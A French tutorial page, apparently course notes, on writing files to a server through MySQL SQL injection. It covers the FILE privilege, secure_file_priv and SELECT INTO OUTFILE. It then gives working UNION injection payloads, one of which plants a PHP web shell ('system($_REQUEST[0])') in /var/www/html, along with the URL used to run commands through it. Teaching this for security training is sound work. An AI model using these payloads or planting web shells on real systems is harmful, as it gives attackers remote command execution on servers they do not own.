---
title:  "Écriture de Fichiers"
category: "Exploitation"
tag: "Principes de base de l'injection SQL"
---
Concernant l'écriture de fichiers dans un serveur back-end, cela devient beaucoup plus complexe que l'écriture dans les SGBD modernes

# Privilèges d'écriture sur les fichiers

Pour écrire des fichiers dans un serveur en utilisant une base de données, on a besoin :
- D'être un utilisateur avec le privilège **FILE**.
- Que la variable globale **secure_file_priv** de MySQL ne soit pas activée.
- Des droits d'écriture sur la localisation où nous voulons écrire sur le serveur.

On a vu dans la section "Lecture de Fichiers" la manière d'identifier si nous avons le droit **FILE**. Nous allons voir maintenant comment inspecter les droits d'écriture de la BDD MySQL, en regardant la variable globale **secure_file_priv**.

### secure_file_priv

Cette variable est utilisée pour déterminer où lire/écrire les fichiers.
On retrouve plusieurs droits en fonction de sa valeur :
- si elle est vide : on peut lire les fichiers depuis l'intégralité du système de fichiers
- valeur à **NULL** : on ne peut pas lire/écrire à partir d'un répertoire.
- Si un certain répertoire est défini, nous ne pouvons lire que dans le répertoire spécifié par la variable.

```sql
SHOW VARIABLES LIKE 'secure_file_priv';  # voir la variable avec MySQL
```

Dans **INFORMATION_SCHEMA** :

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

# SELECT INTO OUTFILE

L'instruction **SELECT INTO OUTFILE** permet d'écrire des données provenant d'instructions SELECT dans des fichiers, principalement utilisée pour exporter des données de tables.

Pour l'utiliser, on ajoute **INTO OUTFILE '...'** après la requête pour exporter le résultat dans le fichier spécifié (voir exemple).

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

On peut également faire des **SELECT** sur des strings dans des fichiers pour écrire des fichiers arbitraires dans les serveurs.

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

# Écriture de fichiers par injection SQL (webshell)

Nous allons prendre un exemple d'écriture d'un fichier texte dans un **webroot** (dossier web de base pour un serveur web).
Liste de webroot pour [linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) et [windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt).

Dans l'exemple précédent, on récupère notre injection **union** avec le webroot /var/www/html

```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

On ne voit plus l'affichage dans le site web mais bien dans le fichier.
> Remarque : Pour éviter d'avoir du contenu non nécessaire dans le fichier tout en ayant la possibilité de faire la requête UNION, on peut utiliser "" à la place des chiffres.

<center><img src="/assets/images/htbAcademy/SQLInjectionFundamentals/INFORMATIONSCHEMA6.png" alt="Alt text"></center>

<center><img src="/assets/images/htbAcademy/SQLInjectionFundamentals/INFORMATIONSCHEMA7.png" alt="Alt text"></center>

## Écriture de Web Shell

Une fois qu'on a la confirmation de l'écriture de nos droits d'écriture de fichiers, on peut écrire un script web PHP dans le webroot. Par exemple, le suivant :

```php
<?php system($_REQUEST[0]); ?>
```

Dans notre cas ça donne :

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

Et on utilise nos commandes de la manière suivante :

```html
www.website.com/script.php?0=myCommand
```